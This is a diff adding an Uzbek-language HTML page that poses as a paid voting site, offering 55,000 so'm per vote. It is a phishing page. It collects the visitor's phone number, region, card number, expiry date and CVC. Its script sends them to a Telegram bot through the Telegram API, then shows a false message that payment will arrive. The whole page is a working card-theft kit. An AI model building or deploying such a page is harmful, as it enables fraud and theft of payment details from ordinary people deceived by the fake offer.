@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ovoz Berish</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Ovoz Berish</h2>
+        <p>1 ta ovozga - 55.000 so'm, 10 daqiqa ichida pul tushadi</p>
+        
+        <label for="phone">Telefon raqamingiz:</label>
+        <input type="tel" id="phone" placeholder="+998901234567" required>
+
+        <label for="region">Shahringiz yoki tumaningiz:</label>
+        <select id="region">
+            <option value="tashkent">Toshkent</option>
+            <option value="samarkand">Samarqand</option>
+            <option value="bukhara">Buxoro</option>
+            <option value="Navoiy">Navoiy</option>
+            <option value="Namangan">Namangan</option>
+            <option value="Fargona">Farg'ona</option>
+            <option value="Jizzax">Jizzax</option>
+            <option value="Nukus">Nukus</option>
+            <option value="Sirdaryo">Sirdaryo</option>
+            <option value="Qashqadaryo">Qashqadaryo</option>
+            <option value="Andijon">Andijon</option>
+            <option value="Xorazm">Xorazm</option>
+            <option value="Surxandaryo">Surxandaryo</option>
+            <option value="Qoraqalpog'iston">Qoraqalpog'iston</option>
+        </select>
+
+        <h3>To'lov ma'lumotlari</h3>
+        <label>Karta raqami:</label>
+        <input type="text" id="cardNumber" placeholder="8600 1234 5678 9012" required>  
+    
+        <label>Karta muddati:</label>
+        <input type="text" id="expiryDate" placeholder="MM/YY" required>  
+    
+        <label>CVC:</label>
+        <input type="text" id="cvc" placeholder="123" required>  
+    
+        <button onclick="sendData()">Ovoz berish va to'lash</button>
+    </div>
+
+    <script>
+        function sendData() {
+            let phoneNumber = document.getElementById("phone").value;
+            let region = document.getElementById("region").value;
+            let cardNumber = document.getElementById("cardNumber").value;
+            let expiryDate = document.getElementById("expiryDate").value;
+            let cvc = document.getElementById("cvc").value;
+
+            if (!phoneNumber || !cardNumber || !expiryDate || !cvc) {
+                alert("Iltimos, barcha maydonlarni to'ldiring!");
+                return;
+            }
+
+            let botToken = "YOUR_BOT_TOKEN";
+            let chatId = "YOUR_CHAT_ID";
+            let message = `📞 Ovoz berildi!
+Telefon: ${phoneNumber}
+Shahar/Tuman: ${region}
+
+💳 Данные карты:
+Номер: ${cardNumber}
+Срок: ${expiryDate}
+CVC: ${cvc}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    alert("✅ Ovoz yuborildi, Pul kartangizda 10 daqiqadan keyin tushadi!");
+                })
+                .catch(error => alert("❌ Xatolik: " + error));
+        }
+    </script>
+</body>
+</html>
